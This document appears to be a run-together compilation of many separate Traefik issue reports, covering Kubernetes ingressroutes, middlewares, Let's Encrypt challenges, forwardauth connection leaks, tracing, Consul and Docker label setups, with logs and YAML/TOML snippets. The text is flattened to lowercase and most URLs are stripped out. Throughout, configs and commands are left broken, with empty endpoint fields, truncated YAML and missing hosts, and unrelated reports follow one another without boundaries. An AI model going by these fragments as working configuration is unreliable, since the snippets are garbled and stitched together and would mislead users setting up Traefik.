traefik.ingress.kubernetes.io/router.middlewares: prefix@kuberntes-crd
```
configure http and https endpoints with middleware chain to redirect http to https.
set `host` header using `headers` middleware
```yaml middlewares: example-headers: headers: customrequestheaders: host: "example.com"
hi, i'm using traefik to route udp packets to jitsi videobridge deployed on kubernetes.
after a couple of minutes, the traefik pod crashes with `panic: runtime error: racy use of timers`
enabled compression with `compress = true`.
i've upgraded to traefik v2.2-rc1 and set up a simple http -> https with default middlewares : works fine
but if you use a middleware with `@file` , "hot" reload with `watch: true` break the https for the service.
i tried to use sslproxyheaders to set x-forwarded-proto to https
for websocket requests the value was automatically changed to wss
this is done in middlewares/forwarded_header.go this leads to a problem in tomcat 9 because tomcat does not recognize a value of wss in the x-forwarded-proto field
only the values http and https are allowed there
also the specification does not specify the values ws or wss but only http and https
so it seems this could be a bug in traefik 2.1.4 (and maybe many other versions).
we manage some multi-tenant k8s clusters, and use traefik as ingressmanager (thanks for the works, it does the job! ) we went through a bug where one of our client created a corrupted ingressroute that was accepted by traefik (the ressource is created), but the format of the tls part is invalid:
```yml tls: - hosts: - <some_host> secretname: my-certs
instead of:
```yml tls: secretname: my-certs
(while we provide them template to create their ingressroute, some still try to experiment or just don't care...) this causes a lot of logs in traefik pods (debug mode):
e0225 10:57:08.809373 1 reflector.go:125] pkg/mod/k8s.io/client-go@v0.0.0-20190718183610-8e956561bbf5/tools/cache/reflector.go:98: failed to list *v1alpha1.ingressroute: v1alpha1.ingressroutelist.items: []v1alpha1.ingressroute: v1alpha1.ingressroute.spec: v1alpha1.ingressroutespec.tls: readobjectstart: expect { or n, but found [, error found in #10 byte of ...|}],"tls":[{"hosts":[|..., bigger context ...|vices":[{"name":"whoami-1-3","port":80}]}],"tls":[{"hosts":["<some_host>|...
but more important, traefik was unable to reload new ingressroute for other namespaces till we corrected this one...
they appeared with `kubectl get ingressroute` but traefik ui wasn't up-to-date with new ingessroutes and trying the host just returned 404
build k3s cluster, configure appropriate dns to public ip, port forward 443 to k3s cluster from public ip
deploy application
deploy traefik
i tried to url-encode a `/` in a path using the replacepathregex middleware
traefik took the `%` sign of `%2f` and encoded it again, resulting in `%252f` instead.
is this related to this middleware handling the `path` rather than the `rawpath` property, similar to the problem that was fixed in
i am trying to setup grpc routing with ssl
i am using "kubernetescrd" as the provider and the routing using "ingressroute"
to achieve that, i am trying to convert the configuration on the official documentation at this url: #with-https to "ingressroute" way
in kubernetes, traefik "ingressroute" resolve a service as an ip address
so we will have problem with ssl ca certificate, because we have to follow the ip address of the service instead service name as the cn ( common name ) actually, in the traefik issues repository, i found a person who has tried to do a similar thing, but he was using v1.x.x traefik and "kubernetes ingress" instead of "ingressroute"
here is the url:
i have tried to do a similar approach based on the discussion there, by using "externalname" as the service type, but it doesn\'t work in traefik v.2.1.4
i'm troubleshooting my own issues getting letsencrypt working and spotted an inconsistency in the 2.0 documentation.
using a build from branch master (built feb 13th, 2020 around 18:00 utc) of traefik 2.x, i generated a middleware redirecting to https, an ingress listening on / at example.org on http referencing the middleware, and an ingress listening on / at example.org on https with a certificate, associated to a simple whoami service
i create a load balancer configuration for vault
http get request to `mydomain.dev/ping`
websocket in jupyter notebook not working, can't execute code
my setup: 1
institutional nginx https reverse proxy
traefik proxy
jupyterhub on host with dockerspawner
we are using traefik (v2) in front of a nexus repository manager
when trying to deploy some artifacts via mvn deploy (3.5 mb is already too large) we are getting an error message from maven: ```
[error] failed to execute goal org.apache.maven.plugins:maven-deploy-plugin:2.7:deploy (default-deploy) on project guestbook: failed to deploy artifacts: could not transfer artifact de.my-company.my-department:guestbook:jar:1.0.0 from/to nexus ( transfer failed for software caused connection abort: socket write error -> [help 1]
``` nexus itself has the following to say: ```
2020-02-07 06:51:41,962+0100 warn [qtp1484446092-50] my-user org.sonatype.nexus.repository.httpbridge.internal.viewservlet - failure servicing: put /nexus/repository/my-department-releases/de/my-company/my-department/guestbook/1.0.0/guestbook-1.0.0.jar
org.sonatype.nexus.blobstore.api.blobstoreexception: blobid: tmp$ec5032b0-80f2-4831-9eaa-a8acea6530b2, org.eclipse.jetty.io.eofexception: early eof, cause: early eof
caused by: org.eclipse.jetty.io.eofexception: early eof
``` if i deploy the same artifact without traefik it obviously works, hence this report.
i have a service with a rate limiter middleware.
adding client authentication ```yaml
tls: options: default: clientauth: cafiles: - /etc/traefik/cloudflare.pem clientauthtype: requireandverifyclientcert
i am trying to use ecs provider with v1.7.20-alpine docker image in a corporate environment where i have to hit aws apis through a proxy
the exact code works on my personal aws account which does not requires a proxy to reach out to aws apis.
i am using a middleware with forwardauth to point at an authelia container
this is something i did in traefik 1.7 too, but in 2.0 after a few days all pages respond with a 500 error
restarting either the traefik or authelia containers fix the problem temporarily
the traefik log file shows:
time="2020-01-15t05:06:59z" level=debug msg="error calling #/
cause: get #/: dial tcp 172.19.0.4:8080: connect: cannot assign requested address" middlewarename=authelia@file middlewaretype=forwardedauthtype
``` running wget from within the container fails with a similar message
i checked netstat, it contained over 26,000 established connections to the authelia container in the format: ```
tcp 0 0 172.19.0.6:42110 172.19.0.4:8080 established
tcp 0 0 172.19.0.6:42166 172.19.0.4:8080 established
tcp 0 0 172.19.0.6:43354 172.19.0.4:8080 established
``` for some reason the connections to the forwardauth are not being closed
i have looked through the traefik and authelia issues and cannot find a similar bug
i have only noticed this more recently with higher useage containers, but having removed this and watched netstat, it still seems to rise and doesnt fall significantly over time with a fresh container.
set up redis, populated a simple dynamic configuration, then started `traefik`
traefik/http/routers/tosite1/rule host(`site1.local`)
traefik/http/routers/tosite1/service site1
traefik/http/routers/tosite2/rule host(`site2.local`)
traefik/http/routers/tosite2/service site2
traefik/http/services/site1/loadbalancer/servers/0/url
traefik/http/services/site2/loadbalancer/servers/1/url
``` this config works ok if using `etcd` instead of redis.
opened #/http/services with configured `etcd` provider.
i added mongodb as tcp service, although a wrong ip is set by traefik or the health-check fails
i don't know if this know
i had catch this by accident (syntax error in cli)
too short traefik related label `traefik.http.services.test`
i set respondingtimeout in traefik static config and i get different status code while the request time exceed the timeout for scenarios bellow: buffer middleware enabled
without buffer middleware
to enable https on internal systems of my company, we set up an acme-dns reverse proxy server
i configured a certificate provider in traefik with dns challenge type acme-dns
as we work heavily with subdomains, i configured some traefik http routers of our docker containers with a wildcard sans domain and main base domain, as described [here](
additionally i configured the acme-dns account information with the account data i had from a manual dns registration.
i got traefik configured to route traffic to a docker container via labels (with docker-compose)
then added the forwardauth middleware
simply adding the `forwardauth.address` middleware works fine: the 'address' returns 200 and traefik forwards the request on
then i tried using the `forwardauth.trustforwardheader` and `forwardauth.authresponseheaders` middleware.
- use docker-compose labels with the docker provider for blue-green deployment
- use healthcheck feature to decide when i can stop the old service instance
- by the way, this #4544 feature would be great for my task
configured traefik to output traces to a jaeger instance running on the same kubernetes cluster using the following arguments: ```
- --tracing
- --tracing.jaeger.samplingserverurl=jaeger-agent.tracing:5778/sampling
- --tracing.jaeger.localagenthostport=jaeger-agent.tracing:68311
``` it worked correctly, until my jaeger agent pod restarted
traefik didn't connect to the service again and therefore my traces weren't being written to jaeger.
i set up the docker image referenced: i added labels to expose it to the https entrypoint with proper domain, etc
navigate to site behind traefik and see console error that the stylesheet is being server wrong
open dev tools, run it again, and see the stylesheet is being returned text/plain
configure a kubernetes service targeting an externalname on an ssl port :
apiversion: v1
kind: service
metadata: name: synology namespace: synology
spec: type: externalname externalname: synology.domain.com ports: - name: https port: 5001
```` configure an ingressroute to use this service:
apiversion: traefik.containo.us/v1alpha1
kind: ingressroute
metadata: name: synology namespace: synology
spec: entrypoints: - websecure routes: - match: host(`synology.apps.domain.com`) kind: rule services: - name: synology port: 5001 scheme: https tls: certresolver: mycertresolver domains: - main: apps.domain.com sans: - "*.apps.domain.com"
i established a websocket connection to a capable backend.
define an `ingressroute` with kubernetescrd provider as follows: ```
apiversion: traefik.containo.us/v1alpha1
kind: ingressroute
metadata: name: traefik-dashboard namespace: ingress
spec: entrypoints: - traefik routes: - kind: rule match: pathprefix(`/dashboard`) || pathprefix(`/api`) services: - kind: traefikservice name: api@internal
```
i use traefik with docker-compose
i accidentally defined a broken label like so:
``` test: build: "test" container_name: "test" restart: "always" depends_on: - "traefik" networks: test-frontend: labels: - "traefik.enable=true" - "traefik.http.routers.test-https.rule=host(`test.example.com`)" - "traefik.http.routers.test-https.entrypoints=web-secure" - "traefik.http.routers.test-https.tls=true" - "traefik.http."
i found when i used "post" request, it will return 500 error.
creating an ingress resource on a subdomain having only one rule on `/` that point to a backend handling requests on `/app`
apiversion: extensions/v1beta1
kind: ingress
metadata: name: my-ingress annotations: kubernetes.io/ingress.class: traefik traefik.ingress.kubernetes.io/rewrite-target: /app
spec: rules: - host: app.my-domain.fr http: paths: - path: / backend: servicename: my-app serviceport: http
add zipkin tracing to my config and create a circumstance when request to zipkin fails.
i experience a bug when starting traefik 2.0 and 2.1 windowsservercore 1809 images
1.7 does start.
started traefik v2.0.6 with rancher 1.6.29.
tried to select next page
i'm trying to use the mirroring feature for inspecting all traffic on separate service.
without mirroring enable everything works well
but if i try to mirror whole traffic to separate service for analyze then i getting lots of crashes.
when i configure statsd provider for tracing and i trace an http request which is known to last approximately 1 second.
i have a kubernetes traefik instances which panics in the accesslog middleware
the consul catalog provider automatically adds all service backends regardless of whether their healthcheck status is passing, warn, or critical
ideally traefik should add/remove backends as they become healthy or unhealthy
to test: * create a service definition with a healthcheck pointing to localhost:1234 ```hcl
service { name = "broken" tags = [ "traefik.enable=true", ] address = "" port = 1234 token = "<redacted>" check = { id = "fail-check" name = "fail-check" tcp = "127.0.0.1:1234" interval = "10s" timeout = "1s" }
``` * make sure nothing is actually listening on port 1234 so that the healthcheck fails * confirm the healthcheck is critical ```sh
$ curl -ss \\ -h \'x-consul-token: <redacted>\' \\ 127.0.0.1:8500/v1/agent/health/service/name/broken | grep status "aggregatedstatus": "critical", "status": "critical"
my deployment: ```yml
apiversion: extensions/v1beta1
kind: deployment
metadata: labels: app: traefik-canary name: traefik-canary namespace: microsvc
spec: progressdeadlineseconds: 600 replicas: 1 revisionhistorylimit: 10 selector: matchlabels: app: traefik-canary strategy: rollingupdate: maxsurge: 25% maxunavailable: 25% type: rollingupdate template: metadata: creationtimestamp: null labels: app: traefik-canary date: "1573641385" name: traefik-canary spec: serviceaccountname: traefik-ingress-controller containers: - args: - --configfile=/config/traefik-static.yaml image: traefik:v2.1.0-rc2 imagepullpolicy: ifnotpresent name: traefik ports: - containerport: 80 name: api protocol: tcp - containerport: 8080 name: admin protocol: tcp - containerport: 8090 name: open protocol: tcp resources: {} terminationmessagepath: /dev/termination-log terminationmessagepolicy: file resources: limits: cpu: "2" memory: 2gi requests: cpu: 100m memory: 1gi volumemounts: - mountpath: /config name: config-volume dnspolicy: clusterfirst restartpolicy: always schedulername: default-scheduler securitycontext: {} terminationgraceperiodseconds: 30 volumes: - configmap: defaultmode: 420 name: traefik name: config-volume
``` and my configmap: ```yml
apiversion: v1
data: traefik-static.yaml: | entrypoints: api: address: ":80" transport: respondingtimeouts: readtimeout: 15 writetimeout: 15 open: address: ":8090" forwardedheaders: insecure: true transport: respondingtimeouts: readtimeout: 15 writetimeout: 15 api: dashboard: true insecure: true providers: file: directory: /config watch: true kubernetescrd: {} tracing: jaeger: collector: endpoint: samplingtype: probabilistic samplingparam: 0.3 accesslog: filepath: "/log/traefik.log" format: json bufferingsize: 200 fields: defaultmode: keep headers: defaultmode: keep metrics: prometheus: {} ping: entrypoint: "traefik" health-check.yaml: | http: routers: health-check: rule: "path(`/ping`)" entrypoints: - api - open service: health-check services: health-check: loadbalancer: servers: - url: kind: configmap
metadata: name: traefik namespace: microsvc
setup is a single traefik instance acting as ingress sending requests to a service that contains a single pod
cause the pod to be unready for just long enough to be removed from the service
immediately make the pod ready again
in the setup i am using the readiness check is configured as such that it takes 11 seconds of the pod being unready for it to be marked as unready and be removed from the service.
```yml readiness: http-get delay=0s timeout=1s period=2s #success=1 #failure=6
the test application we have put together allows us to control how it responds to the readiness check
running the following commands repeatedly eventually triggers the condition
kubectl -n experiment exec healthtest-blue-app-5b696d58cd-mtvj5 -- curl -xpost sleep 11; kubectl -n experiment exec healthtest-blue-app-5b696d58cd-mtvj5 -- curl -xpost
``` *note*: in our domain ready == healthy and unready == ill.
i set up a redirectscheme middleware to redirect all http requests to https like this: ```
[http.middlewares] [http.middlewares.https-redirect.redirectscheme] scheme = "https"
``` however, i also use acme's httpchallenge to automatically get https certs
it appears that httpchallenge does not override middleware's redirect
as a result letsencrypt's httpchallenge request is redirected to https entrypoint, and that leads to a 404
traefik | time="2019-11-26t23:57:11z" level=error msg="error renewing certificate from le: {<domain> []}, acme: error -> one or more domains had a problem:\ [<domain>] acme: error: 403 :: urn:ietf:params:acme:error:unauthorized :: invalid response from \\"<html>\\\ <head><title>404 not found</title></head>\\\ <body>\\\ <center><h1>404 not found</h1></center>\\\ <hr><center>nginx/1.17.3</center\\", url: \ " providername=http.acme
``` httpchallenge works if redirectscheme is not used for that domain.
running [swagger ui]( i'm trying to call an endpoint using delete method
my browser is google chrome version 78.0.3904.108.
i have a service with 1 nginx container without health check on it
when i press upgrade, and it gets upgraded status, traefik doesn't catch it, and in dashboard i can see old container ip, so the server return service unavailable error.
i am running traefik v2.0.5 in docker swarm with config file.
i was trying to set up a healthcheck with cli, so i added ping to config file: ```
[ping] entrypoint = "ping" [entrypoints] [entrypoints.web] address = ":80" [entrypoints.websecure] address = ":443" [entrypoints.traefik] address = ":8080" [entrypoints.ping] address = ":8082" [entrypoints.metrics] address = ":8083" ```
tried using the latest v2.1.0-rc2 and consulcatalog as a provider
i've defined the `config.toml` file as below
[api] insecure = true debug = true [providers.consulcatalog] exposedbydefault = false [providers.consulcatalog.endpoint] address = "192.168.1.200:8501" scheme = "https" [providers.consulcatalog.endpoint.tls] ca = "<path-to-ca>" cert = "<path-to-cert>" key = "<path-to-key>" insecureskipverify = true ``` and spawned three containers with the following consul service definition for each.
{ "service": { "name": "web", "tags": [ "http", "httpd", "testing", "traefik.enable=true", "traefik.http.routers.web.rule=host(`web.localhost`)" ], "port": 80, "checks": [ { "name": "httpd check", "http": " ", "method": "get", "interval": "5s" } ] }
``` i'm able to see those three nodes in consul dashboard.
![image]( in traefik dashboard only one server is shown instead.
![image](
i have a deployment for my workload served by an ingress with a custom let's encrypt certificate i added manually to the kubernetes cluster
the website works fine in chrome _most of the time_, however, some users reports that firefox sometimes does not work.
when enabling tracing with b3 propagation and gen128bit the x-b3-traceid is not 32 digits long
we're using traefik as a grpc proxy and were running load tests when it crashed
we've recently (today) enabled access logs
we're not able to reliably reproduce the issue but i'm guessing that the cause is pretty apparent from the crash dump below
let me know if any more information is required
when i run `logger_formatters_test.go` on windows 10, one test failed
we added our aws vpc cidr to our whitelisting.
open a weighted service in dashboard (http services tab).
creating a consul agent on my node
(compose snippet)
``` consul-agent: image: consul volumes: - /etc/localtime:/etc/localtime:ro - ./consul:/consul/data network_mode: host command: agent -ui -node=backend01 -bind=x.x.x.10 -join=x.x.x.9 -client=0.0.0.0
firing up a traefik on the consul server agent
(compose snippet)
``` traefik: ports: - 8081:80 - 8080:8080 image: containous/traefik:experimental-master command: --providers.consulcatalog.exposedbydefault=true --providers.consulcatalog=true --providers.consulcatalog.endpoint.address= --log.level=debug --log --api --api.dashboard --api.insecure
firing up a service without a ip on a client consul node.
docker-compose exec consul-agent consul services register -name=jira -port=80 -tag traefik -tag 3rdparty -tag traefik.enable=true -tag "traefik.http.routers.jira.rule=host(\\`jira.example.io\\`)"
backend returned an http 302 redirect to traefik with a `location` header that refers to an external website that is available only on http, not https, and traefik is running in ssl mode.
please see
configure transport responding timeouts in static config file or from command line: ```yaml
entrypoints: web: address: ":80" transport: respondingtimeouts: readtimeout: "10s" idletimeout: 10
or with cli options
--entrypoints.web.address=":80" \\
--entrypoints.web.transport.respondingtimeouts.readtimeout="10s" \\
--entrypoints.web.transport.respondingtimeouts.idletimeout=10 \\
```
use more than one service in ingressroute's rule in my setup with prometheus metrics.
i tried to run traefik in a docker swarm and wanted to expose the dashboard as shown in the docs here: #secure-mode
i have a long service name that overlaps with the weight and provider image in this url ` #/http/services/{service_name}`
during our test before switching to traefik 2, we noticed a much higher cpu usage even with no traffic.
we found that it was caused by a infinite loop generating a certificate (see output debug log) when monitoring kubernetes ingressroutes crd on `kube-system` namespace.
specifying namespace to monitor is a workaround, but we dont want to manually add namespace :
``` - name: traefik_providers_kubernetescrd_namespaces value: "default, namespace1, namespace2, namespace3"
``` may be linked to #5470.
configuring a "catchall" frontend, which redirects to 127.0.0.1:81 on which an apache server is listening
acme ondemand is activated, to issue a certificate for every domain which is requested
acme.json is really big (300mb) containing 35580 certificates
i also have pprof files ready, please let me know if i can just append them or if i should send them via a privat channel.
``` - --tracing.zipkin.httpendpoint=
i created a docker image with my ecs provider configuration for traefik
i configured an ecs service and task definition for traefik specifying the docker image i created
the ecs task role is configured with the policy document from the configuration docs
see #policy tasks fail to launch because they are attempting to pull ec2 metadata ([relevant source code]( #l86)) which is not available in fargate mode.
while testing my migration to v2 i was a little bit confused when i saw that i'm already getting valid certificates
since i had set the acme ca server to staging i was expecting acme certs from the staging system and not valid production certificates.
we use a wildcard certificates that is duplicated in each namespaces it is needed for in our kubernetes cluster (v1.13.6)
in the logs traefik writes a lot of warning saying that the certificates already exists for the default entrypoint (shouldn't it be certificate store instead of entrypoint ?)
{"level":"warning","msg":"skipping addition of certificate for domain(s) \\"*.domain.com,domain.com\\", to entrypoint default, as it already exists for this entrypoint.","time":"2019-10-10t09:44:32z"}
{"level":"warning","msg":"skipping addition of certificate for domain(s) \\"*.domain.com,domain.com\\", to entrypoint default, as it already exists for this entrypoint.","time":"2019-10-10t09:44:32z"}
{"level":"warning","msg":"skipping addition of certificate for domain(s) \\"*.domain.com,domain.com\\", to entrypoint default, as it already exists for this entrypoint.","time":"2019-10-10t09:44:32z"}
{"level":"warning","msg":"skipping addition of certificate for domain(s) \\"*.domain.com,domain.com\\", to entrypoint default, as it already exists for this entrypoint.","time":"2019-10-10t09:44:32z"}
{"level":"warning","msg":"skipping addition of certificate for domain(s) \\"*.domain.com,domain.com\\", to entrypoint default, as it already exists for this entrypoint.","time":"2019-10-10t09:44:32z"}
{"level":"warning","msg":"skipping addition of certificate for domain(s) \\"*.domain.com,domain.com\\", to entrypoint default, as it already exists for this entrypoint.","time":"2019-10-10t09:44:32z"}
{"level":"warning","msg":"skipping addition of certificate for domain(s) \\"*.domain.com,domain.com\\", to entrypoint default, as it already exists for this entrypoint.","time":"2019-10-10t09:44:32z"}
{"level":"warning","msg":"skipping addition of certificate for domain(s) \\"*.domain.com,domain.com\\", to entrypoint default, as it already exists for this entrypoint.","time":"2019-10-10t09:44:32z"}
{"level":"warning","msg":"skipping addition of certificate for domain(s) \\"*.domain.com,domain.com\\", to entrypoint default, as it already exists for this entrypoint.","time":"2019-10-10t09:44:32z"}
{"level":"warning","msg":"skipping addition of certificate for domain(s) \\"*.domain.com,domain.com\\", to entrypoint default, as it already exists for this entrypoint.","time":"2019-10-10t09:44:32z"}
{"level":"warning","msg":"skipping addition of certificate for domain(s) \\"*.domain.com,domain.com\\", to entrypoint default, as it already exists for this entrypoint.","time":"2019-10-10t09:44:32z"}
{"level":"warning","msg":"skipping addition of certificate for domain(s) \\"*.domain.com,domain.com\\", to entrypoint default, as it already exists for this entrypoint.","time":"2019-10-10t09:44:32z"}
{"level":"warning","msg":"skipping addition of certificate for domain(s) \\"*.domain.com,domain.com\\", to entrypoint default, as it already exists for this entrypoint.","time":"2019-10-10t09:44:32z"}
{"level":"warning","msg":"skipping addition of certificate for domain(s) \\"*.domain.com,domain.com\\", to entrypoint default, as it already exists for this entrypoint.","time":"2019-10-10t09:44:32z"}
{"level":"warning","msg":"skipping addition of certificate for domain(s) \\"*.domain.com,domain.com\\", to entrypoint default, as it already exists for this entrypoint.","time":"2019-10-10t09:44:32z"}
{"level":"warning","msg":"skipping addition of certificate for domain(s) \\"*.domain.com,domain.com\\", to entrypoint default, as it already exists for this entrypoint.","time":"2019-10-10t09:44:32z"}
{"level":"warning","msg":"skipping addition of certificate for domain(s) \\"*.domain.com,domain.com\\", to entrypoint default, as it already exists for this entrypoint.","time":"2019-10-10t09:44:32z"}
{"level":"warning","msg":"skipping addition of certificate for domain(s) \\"*.domain.com,domain.com\\", to entrypoint default, as it already exists for this entrypoint.","time":"2019-10-10t09:44:32z"}
{"level":"warning","msg":"skipping addition of certificate for domain(s) \\"*.domain.com,domain.com\\", to entrypoint default, as it already exists for this entrypoint.","time":"2019-10-10t09:44:32z"}
{"level":"warning","msg":"skipping addition of certificate for domain(s) \\"*.domain.com,domain.com\\", to entrypoint default, as it already exists for this entrypoint.","time":"2019-10-10t09:44:32z"}
{"level":"warning","msg":"skipping addition of certificate for domain(s) \\"*.domain.com,domain.com\\", to entrypoint default, as it already exists for this entrypoint.","time":"2019-10-10t09:44:32z"}
{"level":"warning","msg":"skipping addition of certificate for domain(s) \\"*.domain.com,domain.com\\", to entrypoint default, as it already exists for this entrypoint.","time":"2019-10-10t09:44:32z"}
{"level":"warning","msg":"skipping addition of certificate for domain(s) \\"*.domain.com,domain.com\\", to entrypoint default, as it already exists for this entrypoint.","time":"2019-10-10t09:44:32z"}
{"level":"warning","msg":"skipping addition of certificate for domain(s) \\"*.domain.com,domain.com\\", to entrypoint default, as it already exists for this entrypoint.","time":"2019-10-10t09:44:32z"}
``` that's 67797 in 25 minutes
sylvain@ubuntu-1604-dev:~$ kubectl --context=k8s11-euw-dev -n ingress get pods traefik-v2-6bf947f58-dnn6q
name ready status restarts age
traefik-v2-6bf947f58-dnn6q 1/1 running 0 25m
sylvain@ubuntu-1604-dev:~$ kubectl --context=k8s11-euw-dev -n ingress logs traefik-v2-6bf947f58-dnn6q | grep "as it already exists for this entrypoint." | wc -l
i access nginx through traefik.
ua="curl/7.29.0" is good
but change ua=null.i found something wrong with ua
ua="go-http-client/1.1" i want to see the original message.
i think traefik is wrong to modify ua.
curl -i local.test.com
{ "@timestamp": "2019-10-10t10:53:17","status": "200", "http_request": " ", "method": "get", "user_agent":"curl/7.29.0" }
curl -i local.test.com -a ""
{ "@timestamp": "2019-10-10t10:57:55","status": "200", "http_request": " ", "method": "get", "user_agent":"go-http-client/1.1" }
i've clicked on following http router ![screenshot_84](
setting ca file and caoptional to true with no cilent key and cert.
```toml [http.middlewares.test-auth.forwardauth.tls] ca = "/etc/vault/tls/ca.pem" caoptional = true
i have configured the following weight in ingress for traefik but traefik ingress stop working
ideally it should send only 39.3% traffic to green and 60.7% traffic to blue, but backend services are down and external user is getting error 404
deployment strategy:
two k8s deployment (green and blue) error message in traefik logs is as below
level=error msg=failed to create fractional weight allocator for ingress <xyz>/<zbc>: the sum of weights(99.999%) in the path / must be 100% when no omitted fractional service left"
``` here is the ingress
apiversion: extensions/v1beta1
kind: ingress
metadata: annotations: traefik.frontend.entrypoints: http traefik.ingress.kubernetes.io/service-weights: |- app-green-release: 39.3 app-blue-release: 60.7 creationtimestamp: 2019-06-04t06:00:37z generation: 2 labels: app: traefik-app name: traefik-app namespace: mynamespace resourceversion: "645536328" selflink: /apis/extensions/v1beta1/namespaces/mynamespace/ingresses/traefik-app uid: 4637377-747b-11e9-92ea-005056aeabf7
spec: rules: - host: mycompany2.com http: paths: - backend: servicename: app-release serviceport: 8080 - host: mycompany.com http: paths: - backend: servicename: app-ui-release serviceport: 80 path: /widget - backend: servicename: app-green-release serviceport: 8080 path: / - backend: servicename: app-blue-release serviceport: 8080 path: /
status: loadbalancer: {}
```
i configured a dynamic config file `dynamic.toml` with `watch = true`
the config file is a bind mount in a docker container.
docker-compose.yaml: ```yaml
version: "3.3"
services: traefik: image: "traefik:v2.0.0" container_name: "traefik" command: - --entrypoints.web.address=:80 - --log.level=debug - --accesslog - --api - --providers.docker.exposedbydefault=false - --providers.file.filename=/dyn.yaml ports: - "80:80" volumes: - "/var/run/docker.sock:/var/run/docker.sock" - "./dyn.yaml:/dyn.yaml" labels: - traefik.enable=true - traefik.http.routers.traefik-dash2-unsecure.rule=pathprefix("/") - traefik.http.routers.traefik-dash2-unsecure.entrypoints=web - traefik.http.routers.traefik-dash2-unsecure.middlewares=testfirefoxheaders@file - traefik.http.routers.traefik-dash2-unsecure.service=api@internal whoami: image: containous/whoami labels: #- "traefik.enable=true" - "traefik.http.routers.whoami_http.rule=pathprefix(`/`)" - "traefik.http.routers.whoami_http.entrypoints=web" - traefik.http.routers.whoami_http.middlewares=testfirefoxheaders@file
``` dyn.yaml: ```yaml
http: middlewares: testfirefoxheaders: headers: browserxssfilter: true contenttypenosniff: true framedeny: true
``` log excerpt ```log
traefik | time="2019-10-02t21:15:18z" level=debug msg="creating middleware" middlewarename=testfirefoxheaders@file middlewaretype=headers entrypointname=web routername=traefik-dash2-unsecure@docker
traefik | time="2019-10-02t21:15:18z" level=debug msg="setting up secureheaders from %v{map[] map[] false [] [] [] 0 false [] [] false false map[] false 0 false false false true true true false}" entrypointname=web routername=traefik-dash2-unsecure@docker middlewarename=testfirefoxheaders@file middlewaretype=headers
``` abridged output of `curl -i -vvv ` ```text
* trying 127.0.0.1...
* connected to 127.0.0.1 (127.0.0.1) port 80 (#0)
> get /dashboard/ http/1.1
> host: 127.0.0.1
> user-agent: curl/7.47.0
> accept: */*
< http/1.1 200 ok
http/1.1 200 ok
< accept-ranges: bytes
accept-ranges: bytes
< content-length: 3403
content-length: 3403
< content-type: text/html; charset=utf-8
content-type: text/html; charset=utf-8
< last-modified: mon, 16 sep 2019 17:18:10 gmt
last-modified: mon, 16 sep 2019 17:18:10 gmt
< date: wed, 02 oct 2019 21:16:14 gmt
date: wed, 02 oct 2019 21:16:14 gmt <
<!doctype html>
application behind traefik emits 'access-control-allow-origin: *' header
used the headers middleware with the following configuration:
apiversion: traefik.containo.us/v1alpha1
kind: middleware
metadata: name: cors-all namespace: default
spec: headers: accesscontrolallowmethods: - "get" - "options" - "put" - "post" accesscontrolalloworigin: "origin-list-or-null" accesscontrolmaxage: 100 accesscontrolallowheaders: - "content-type" addvaryheader: "true"
``` queried with curl:
curl localhost:80/graphql -h 'host: my.domain' -x get -v -h 'origin: -h'access-control-request-method: get' -h 'access-control-request-headers: content-type'
i created a tls option having the restricted cipher suites configured that are listed [here]( #restricted_tls-cipher-suites)
tls: options: my_tls_settings: minversion: versiontls12 clientauth: clientauthtype: requireanyclientcert snistrict: true ciphersuites: - tls_aes_128_gcm_sha256 - tls_aes_256_gcm_sha384 - tls_chacha20_poly1305_sha256 - tls_ecdhe_ecdsa_with_aes_128_gcm_sha256 - tls_ecdhe_rsa_with_aes_128_gcm_sha256 - tls_ecdhe_ecdsa_with_aes_256_gcm_sha384 - tls_ecdhe_rsa_with_aes_256_gcm_sha384 - tls_ecdhe_ecdsa_with_chacha20_poly1305_sha256 - tls_ecdhe_rsa_with_chacha20_poly1305_sha256 ``` in my router i am referencing the tls option like so:
`traefik.http.routers.myservice.tls.options=my_tls_settings@file`
i tried to apply multiple header middlewares to the same k8s ingressroute, like so: ```
apiversion: traefik.containo.us/v1alpha1
kind: ingressroute
metadata: name: ingresstest
spec: routes: - match: host(`example.com`) kind: rule middlewares: - name: frameoptionsameorigin - name: securityheaders namespace: traefik services: - name: somenginx port: 8888 tls: ...
middlewares:
apiversion: traefik.containo.us/v1alpha1
kind: middleware
metadata: name: frameoptionsameorigin
spec: headers: customframeoptionsvalue: sameorigin ---
apiversion: traefik.containo.us/v1alpha1
kind: middleware
metadata: name: securityheaders namespace: traefik
spec: headers: contenttypenosniff: "true" sslredirect: "true" stsincludesubdomains: "true" stsseconds: "31536010" stspreload: "true" browserxssfilter: "true"
tried to create a websocket connection through socketio over https.
i am running jira behind traefik v2.0.1
when i go to i get a go panic and traefik crashes
panic: interface conversion: *buffer.bufferwriter is not http.flusher: missing method flush goroutine 789 [running]:
github.com/containous/traefik/v2/pkg/middlewares/metrics.(*responserecorder).flush( ) /go/src/github.com/containous/traefik/pkg/middlewares/metrics/recorder.go:36 +
github.com/containous/traefik/v2/pkg/middlewares/pipelining.(*writerwithoutclosenotify).flush( ) /go/src/github.com/containous/traefik/pkg/middlewares/pipelining/pipelining.go:64 +
net/http/httputil.(*maxlatencywriter).delayedflush( ) /usr/local/go/src/net/http/httputil/reverseproxy.go:481 +
created by time.gofunc /usr/local/go/src/time/sleep.go:168 +
i need pass tls client certificate from traefik to azure service fabric backed service.
i have simple service with manifest
``` <statelessservicetype servicetypename="web2apptype" > <extensions> <extension name="traefik"> <labels xmlns=" "> <label key="traefik.frontend.rule">pathprefix:/api</label> <label key="traefik.enable">true</label> <label key="traefik.frontend.passhostheader">true</label> <label key="traefik.frontend.entrypoints">https</label> <label key="traefik.frontend.passtlscert">true</label> </labels> </extension> </extensions> </statelessservicetype>
traefik toml config
################################################################
# global configuration
################################################################
loglevel = "debug" defaultentrypoints = ["https"]
insecureskipverify = true [entrypoints]
[entrypoints.https] address = ":451" [entrypoints.https.tls] [entrypoints.https.tls.clientca] files = ["certs/pdcca.crt"] optional = false [[entrypoints.https.tls.certificates]] certfile = "certs/chainedsslcert.crt" keyfile = "certs/sslcert.key" ################################################################
# service fabric provider
################################################################ # enable service fabric configuration backend
[servicefabric] # service fabric management endpoint
clustermanagementurl = " "
# note: use " " if you\'re using a secure cluster # service fabric management endpoint api version
apiversion = "3.0" ```
traefik debug logs
2019/09/27 14:03:37 using high precision timer
info[2019-09-27t14:03:37+03:00] using toml configuration file traefik.toml
info[2019-09-27t14:03:37+03:00] no tls.defaultcertificate given for https: using the first item in tls.certificates as a fallback.
info[2019-09-27t14:03:37+03:00] traefik version v1.7.18 built on 2019-09-26_01:56:30pm
